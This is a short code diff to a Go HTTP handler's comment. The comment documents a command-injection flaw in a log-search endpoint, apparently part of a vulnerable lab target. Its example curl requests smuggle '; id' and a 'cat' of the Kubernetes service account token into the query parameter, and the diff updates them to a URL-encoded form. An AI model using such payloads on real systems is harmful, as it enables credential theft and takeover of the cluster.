@@ -74,8 +74,8 @@ func handleNodes(w http.ResponseWriter, r *http.Request) {
 //
 // ATTACK (basic):
 //   curl 'http://agent:8080/api/v1/logs/search?q=error'
-//   curl 'http://agent:8080/api/v1/logs/search?q=error;+id'
-//   curl 'http://agent:8080/api/v1/logs/search?q=x;+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'
+//   curl 'http://agent:8080/api/v1/logs/search?q=error+/var/log/%3B+id'
+//   curl 'http://agent:8080/api/v1/logs/search?q=error+/var/log/%3B+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'
 //
 // The shell metacharacters are never stripped, so anything after `;` executes
 // in the same shell context as the agent process.
